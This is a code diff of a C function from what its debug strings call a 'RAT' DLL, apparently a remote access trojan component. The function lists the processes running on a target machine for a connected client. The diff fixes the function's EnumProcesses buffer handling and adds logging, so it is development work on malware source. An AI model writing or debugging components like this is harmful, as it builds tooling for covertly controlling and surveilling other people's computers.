@@ -81,42 +81,25 @@ INT handleProcessList(SOCKET clientSock)
 INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out INT* numProcesses)
 {
 	INT status = SUCCESS;
-	DWORD *aProcesses = NULL, cbNeeded = 0, cProcesses = 0;
+	DWORD aProcesses [1024], cbNeeded = 0, cProcesses = 0;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
 	TCHAR szProcessName[MAX_PATH];
 	UINT64 i;
 
-	// We expect this to fail so we can precisely grab the proper number of processes running on target 
-	if (!EnumProcesses(aProcesses, 0, &cbNeeded))
+	// Return value should be non-zero
+	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
 	{
-		aProcesses = (DWORD*)malloc(sizeof(DWORD) * cbNeeded);
-		if (aProcesses == NULL)
-		{
-			OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
-			status = FAILURE;
-			goto cleanup;
-		}
-
-		// We failed for real this time
-		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
-		{
-			sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from EnumProcesses %d\n", status);
-			OutputDebugStringA(msgBuf);
-			status = FAILURE;
-			goto cleanup;
-		}
-	}
-
-	// This succeeded when it shouldn't have...
-	else
-	{
-		OutputDebugStringA("RAT - Dll - Process::doProcessList - EnumProcesses succeeded!Should have failed...\n");
+		sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from EnumProcesses %d\n", GetLastError());
+		OutputDebugStringA(msgBuf);
 		status = FAILURE;
 		goto cleanup;
 	}
 
 	// TODO: Could call EnumProcessModulesEx for module information...
 	cProcesses = cbNeeded / sizeof(DWORD);
+
+	sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Found %d processes!\n", cProcesses);
+	OutputDebugStringA(msgBuf);
 
 	*numProcesses = cProcesses;
 
